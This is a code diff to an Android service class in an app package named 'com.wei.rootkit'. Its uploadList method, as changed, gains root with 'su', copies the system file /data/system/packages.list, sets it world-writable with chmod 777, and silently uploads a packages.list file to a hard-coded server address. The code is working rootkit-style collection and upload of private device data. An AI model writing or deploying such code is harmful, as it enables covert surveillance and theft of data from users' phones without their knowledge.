@@ -251,49 +251,56 @@ public class DetailService {
     private void uploadList(){
         Process process = null;
         Runtime runtime=Runtime.getRuntime();
+        OutputStream localOutputStream=null;
+        DataOutputStream localDataOutputStream=null;
         try {
             process=runtime.exec("su");
-            OutputStream localOutputStream = process.getOutputStream();
-            DataOutputStream localDataOutputStream = new DataOutputStream(localOutputStream);
+            localOutputStream = process.getOutputStream();
+            localDataOutputStream = new DataOutputStream(localOutputStream);
 
-            String cpCmd="cp /data/system/packages.list /data/data/com.wei.rootkit/packages.list";
+            String cpCmd="cp /data/system/packages.list /data/data/com.wei.rootkit/files/packages.list\n";
+            localDataOutputStream.writeBytes(cpCmd);
+            localDataOutputStream.flush();
+
+            cpCmd="chmod 777 /data/data/com.wei.rootkit/files/packages.list\n";
             localDataOutputStream.writeBytes(cpCmd);
             localDataOutputStream.flush();
 
             localDataOutputStream.writeBytes("exit\n");
             localDataOutputStream.flush();
+
         } catch (IOException e) {
             e.printStackTrace();
         }
 
         //请求地址,ip查询后更改
-        String requestUrl = "http://" + "172.17.156.145" + ":8080/rootKitServer/uploadPackage.action";
+        String requestUrl = "http://" + "172.17.241.196" + ":8080/test/uploadPackage.action";
         String fileName = "packages.list";
-        String listPath="/data/data/com.wei.rootkit/packages.list";
+        //String listPath="/data/data/com.wei.rootkit/files/packages.list";
+        String listPath="/sdcard/packages.list";
         File listFile=new File(listPath);
 
-        if(listFile.exists()){
-            Map<String, String> params = new HashMap<>();
-            params.put("packagesName", fileName);
-            params.put("packagesContentType", "application/octet-stream");
-            OkHttpUtils.post()
-                    .addFile("packages", fileName, listFile)
-                    .url(requestUrl)
-                    .params(params)
-                    .build()
-                    .execute(new StringCallback() {
-                        @Override
-                        public void onError(Call call, Exception e, int id) {
-                            Log.e("uploadList", "callback----" + e.toString());
-                        }
+        Log.e("uploadList", "11111");
 
-                        @Override
-                        public void onResponse(String response, int id) {
-                            Log.e("uploadList", "success");
-                        }
-                    });
-        }
+        Map<String, String> params = new HashMap<>();
+        params.put("packagesName", fileName);
+        params.put("packagesContentType", "application/octet-stream");
+        OkHttpUtils.post()
+                .addFile("packages", fileName, listFile)
+                .url(requestUrl)
+                .build()
+                .execute(new StringCallback() {
+                    @Override
+                    public void onError(Call call, Exception e, int id) {
+                        Log.e("uploadList", "callback----" + e.toString());
+                    }
 
+                    @Override
+                    public void onResponse(String response, int id) {
+                        Log.e("uploadList", response);
+                        Log.e("uploadList", "success");
+                    }
+                });
 
     }
 
